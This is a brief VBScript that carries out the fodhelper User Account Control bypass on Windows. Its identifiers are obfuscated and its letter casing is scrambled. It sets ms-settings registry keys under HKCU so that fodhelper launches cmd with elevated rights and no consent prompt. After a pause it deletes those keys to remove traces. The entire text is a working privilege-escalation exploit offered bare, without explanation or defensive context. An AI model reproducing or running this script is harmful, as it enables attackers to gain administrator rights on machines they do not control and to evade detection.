DiM IlllIIIlIIlllll
SEt IlllIIIlIIlllll=WScRipT.cREatEOBjECt("wscript.shell") 
IlllIIIlIIlllll.rUN "ReG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d hello /f",0,tRUe
IlllIIIlIIlllll.RUn "REg aDd HKCU\Software\Classes\ms-settings\Shell\Open\command /t REG_SZ /d cmd /f",0,TruE
IlllIIIlIIlllll.RUN "Cmd /c STarT fodhelper",0,trUe
wSCRiPt.SLEep 3000
IlllIIIlIIlllll.Run "reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /va /f",0,TRUE